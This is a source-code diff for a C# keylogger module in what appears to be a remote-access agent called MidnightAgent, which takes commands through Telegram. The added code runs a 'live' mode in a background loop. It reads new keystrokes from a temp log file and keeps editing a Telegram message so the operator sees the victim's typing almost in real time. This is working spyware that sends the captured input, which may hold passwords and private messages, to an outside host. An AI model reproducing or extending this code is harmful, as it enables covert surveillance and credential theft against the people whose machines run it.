@@ -1,34 +1,54 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Threading;
 using System.Threading.Tasks;
+using MidnightAgent.Telegram;
 
 namespace MidnightAgent.Features
 {
     public class KeyloggerFeature : IFeature
     {
+        public static TelegramService TelegramInstance { get; set; }
+
         public string Command => "keylogger";
-        public string Description => "Keylogger (start/stop/dump)";
-        public string Usage => "/keylogger [start|stop|dump]";
+        public string Description => "Keylogger (start [live]/stop/dump)";
+        public string Usage => "/keylogger start [live] | /keylogger stop | /keylogger dump";
 
         private const string WORKER_NAME = "MidnightKeylogger.exe";
         private const string TASK_NAME = "MidnightKeyloggerTask";
         private static readonly string LOG_FILE = Path.Combine(Path.GetTempPath(), "midnight_keylog.txt");
+
+        // Live state
+        private static CancellationTokenSource _liveCts;
+        private static int _liveMessageId = 0;
+        private static bool _isLive = false;
+        private static readonly object _lock = new object();
 
         public Task<FeatureResult> ExecuteAsync(string[] args)
         {
             if (args.Length < 1) return Task.FromResult(FeatureResult.Fail("Usage: /keylogger [start|stop|dump]"));
 
             string action = args[0].ToLower();
+            bool isLiveRequest = args.Length > 1 && args[1].Equals("live", StringComparison.OrdinalIgnoreCase);
 
             try
             {
                 if (action == "start")
                 {
-                    return StartKeylogger();
+                    var result = StartKeylogger(isLiveRequest);
+                    
+                    if (isLiveRequest && result.Result.Success)
+                    {
+                        StartLiveUpdate();
+                        return Task.FromResult(FeatureResult.Ok("🔍 <b>Keylogger started in LIVE mode.</b>"));
+                    }
+                    
+                    return result;
                 }
                 else if (action == "stop")
                 {
+                    StopLiveUpdate();
                     return StopKeylogger();
                 }
                 else if (action == "dump")
@@ -46,7 +66,112 @@ namespace MidnightAgent.Features
             }
         }
 
-        private Task<FeatureResult> StartKeylogger()
+        private void StartLiveUpdate()
+        {
+            lock (_lock)
+            {
+                if (_isLive) StopLiveUpdate();
+                
+                _isLive = true;
+                _liveCts = new CancellationTokenSource();
+                _liveMessageId = 0;
+            }
+
+            Task.Run(async () =>
+            {
+                long lastPos = 0;
+                string currentBuffer = "";
+                string lastBuffer = "";
+                int lastMinute = -1;
+                DateTime lastMessageUpdate = DateTime.MinValue;
+
+                // Initial Send
+                _liveMessageId = TelegramInstance?.SendMessageWithId("⌨️ <b>Live Keylogger Initializing...</b>") ?? 0;
+
+                while (!_liveCts.Token.IsCancellationRequested)
+                {
+                    bool contentChanged = false;
+                    try
+                    {
+                        if (File.Exists(LOG_FILE))
+                        {
+                            using (var fs = new FileStream(LOG_FILE, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                            {
+                                if (fs.Length < lastPos) lastPos = 0; // File was cleared or rotated
+                                
+                                if (fs.Length > lastPos)
+                                {
+                                    fs.Seek(lastPos, SeekOrigin.Begin);
+                                    using (var reader = new StreamReader(fs))
+                                    {
+                                        string newContent = await reader.ReadToEndAsync();
+                                        lastPos = fs.Position;
+                                        
+                                        if (!string.IsNullOrEmpty(newContent))
+                                        {
+                                            currentBuffer += newContent;
+                                            
+                                            // Limit buffer for Telegram (4096 chars)
+                                            if (currentBuffer.Length > 3000)
+                                            {
+                                                currentBuffer = currentBuffer.Substring(currentBuffer.Length - 3000);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        var now = DateTime.Now;
+                        int currentMinute = now.Minute;
+
+                        // Check if we should update:
+                        // 1. Content has changed (new keys)
+                        // 2. Minute has changed (heartbeat/clock update)
+                        if (currentBuffer != lastBuffer || currentMinute != lastMinute)
+                        {
+                            // Throttle updates to at most once per 2 seconds to avoid Rate Limit during fast typing
+                            if (_liveMessageId > 0 && (now - lastMessageUpdate).TotalMilliseconds > 2000)
+                            {
+                                string displayBody = string.IsNullOrEmpty(currentBuffer) ? "<i>(Waiting for keys...)</i>" : System.Net.WebUtility.HtmlEncode(currentBuffer);
+                                string text = $"⌨️ <b>Keylogger Live View [{now:HH:mm}]</b>\n" +
+                                             $"──────────────────\n" +
+                                             $"{displayBody}\n" +
+                                             $"──────────────────\n" +
+                                             $"<i>Use /keylogger stop to finish live view.</i>";
+
+                                TelegramInstance?.EditMessage(_liveMessageId, text);
+                                
+                                lastBuffer = currentBuffer;
+                                lastMinute = currentMinute;
+                                lastMessageUpdate = now;
+                            }
+                        }
+                    }
+                    catch { }
+
+                    await Task.Delay(1000);
+                }
+            });
+        }
+
+        private void StopLiveUpdate()
+        {
+            lock (_lock)
+            {
+                if (!_isLive) return;
+                _isLive = false;
+                _liveCts?.Cancel();
+                
+                if (_liveMessageId > 0)
+                {
+                    TelegramInstance?.EditMessage(_liveMessageId, "🛑 <b>Live Keylogger session ended.</b>");
+                    _liveMessageId = 0;
+                }
+            }
+        }
+
+        private Task<FeatureResult> StartKeylogger(bool isLive = false)
         {
             // check if already running
             if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(WORKER_NAME)).Length > 0)
